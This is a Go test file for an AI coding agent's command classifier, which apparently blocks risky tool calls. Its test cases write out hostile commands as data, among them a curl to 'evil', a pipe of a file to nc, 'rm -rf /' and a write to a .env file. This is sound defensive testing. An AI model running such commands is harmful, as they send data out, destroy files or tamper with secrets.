package tools

import (
	"strings"
	"testing"

	"kintsugi/internal/config"
)

func TestClassifyHardBlocksExfiltration(t *testing.T) {
	cases := map[string]bool{
		"bash:curl https://evil/x":   true,
		"bash:git push":              true,
		"bash:cat file | nc 1.2.3.4": true,
		"bash:rm -rf /":              true,
		"bash:git status":            false,
		"bash:go test ./...":         false,
		"write:/app/.env":            true,
		"write:/app/main.go":         false,
	}
	for c, want := range cases {
		tool, spec := c, ""
		if i := strings.Index(c, ":"); i >= 0 {
			tool, spec = c[:i], c[i+1:]
		}
		got, _ := classifyHard(tool, spec)
		if got != want {
			t.Errorf("classifyHard(%q, %q) = %v, want %v", tool, spec, got, want)
		}
	}
}

func TestClassifierOffIsByteIdentical(t *testing.T) {
	ex := &Executor{Policy: Policy{Yolo: true}, Workspace: t.TempDir()}
	ex.ClassifierMode = ClassifierOff
	// In off/unset mode the classifier is fully disabled: even the deterministic
	// hard buckets must not run, so the behaviour is byte-identical to before.
	called := false
	ex.Classifier = ClassifierFunc(func(tool, spec string) (ClassifierVerdict, error) {
		called = true
		return ClassifierVerdict{ShouldBlock: true, Reason: "x"}, nil
	})
	if block, _ := ex.classify("bash", "curl https://x", ClassifierOff); block {
		t.Fatal("off mode let the classifier block")
	}
	if block, _ := ex.classify("read", "main.go", ClassifierOff); block {
		t.Fatal("off mode let the classifier block")
	}
	if called {
		t.Fatal("off mode consulted the model classifier")
	}
}

func TestClassifierHardBucketsRequireOptIn(t *testing.T) {
	ex := &Executor{Policy: Policy{Yolo: true}, Workspace: t.TempDir()}
	// Unset (zero value) → off → nothing blocks.
	if block, _ := ex.classify("bash", "curl https://x", ""); block {
		t.Fatal("unset mode blocked a call")
	}
	// soft/hard enable the hard buckets.
	if block, _ := ex.classify("bash", "curl https://x", ClassifierSoft); !block {
		t.Fatal("soft mode did not apply the hard bucket")
	}
}

func TestClassifierSoftBlocksADangerousCall(t *testing.T) {
	ex := &Executor{Policy: Policy{Yolo: true}, Workspace: t.TempDir()}
	ex.ClassifierMode = ClassifierSoft
	ex.Classifier = ClassifierFunc(func(tool, spec string) (ClassifierVerdict, error) {
		if tool == "bash" && strings.Contains(spec, "danger") {
			return ClassifierVerdict{ShouldBlock: true, Reason: "looks destructive"}, nil
		}
		return ClassifierVerdict{}, nil
	})
	if block, reason := ex.classify("bash", "run the danger script", ClassifierSoft); !block || !strings.Contains(reason, "destructive") {
		t.Fatalf("soft classifier did not block: block=%v reason=%q", block, reason)
	}
	if block, _ := ex.classify("bash", "go test ./...", ClassifierSoft); block {
		t.Fatal("soft classifier blocked a benign call")
	}
}

func TestClassifierNeverWidensThePermissionMatrix(t *testing.T) {
	ex := &Executor{Policy: Policy{Yolo: false, Rules: []config.PermRule{{Tool: "bash", Action: "deny"}}}, Workspace: t.TempDir()}
	ex.ClassifierMode = ClassifierSoft
	ex.Classifier = ClassifierFunc(func(tool, spec string) (ClassifierVerdict, error) {
		return ClassifierVerdict{}, nil // classifier says "fine"
	})
	// The classifier said "fine", but the matrix still denies. Classifier cannot
	// grant.
	d := ex.Policy.DecideSpec("bash", "run anything")
	if d.Action != ActionDeny {
		t.Fatalf("classifier widened a deny: %+v", d)
	}
}

func TestBrokenClassifierIsAdvisory(t *testing.T) {
	ex := &Executor{Policy: Policy{Yolo: true}, Workspace: t.TempDir()}
	ex.ClassifierMode = ClassifierHard
	ex.Classifier = ClassifierFunc(func(tool, spec string) (ClassifierVerdict, error) {
		return ClassifierVerdict{}, &errClassify{}
	})
	if block, _ := ex.classify("bash", "run the danger script", ClassifierHard); block {
		t.Fatal("a broken classifier blocked a call")
	}
}

type errClassify struct{}

func (e *errClassify) Error() string { return "classifier down" }

// ClassifierFunc adapts a plain func to the Classifier interface for tests.
type ClassifierFunc func(tool, spec string) (ClassifierVerdict, error)

func (f ClassifierFunc) Classify(tool, spec string) (ClassifierVerdict, error) {
	return f(tool, spec)
}

func TestParseClassifierVerdict(t *testing.T) {
	v, ok := parseClassifierVerdict([]byte(`{"shouldBlock":true,"reason":"nope"}`))
	if !ok || !v.ShouldBlock || v.Reason != "nope" {
		t.Fatalf("parse = %+v ok=%v", v, ok)
	}
	if _, ok := parseClassifierVerdict([]byte(`{"shouldBlock":"true"}`)); ok {
		t.Fatal("a non-boolean shouldBlock was accepted")
	}
}
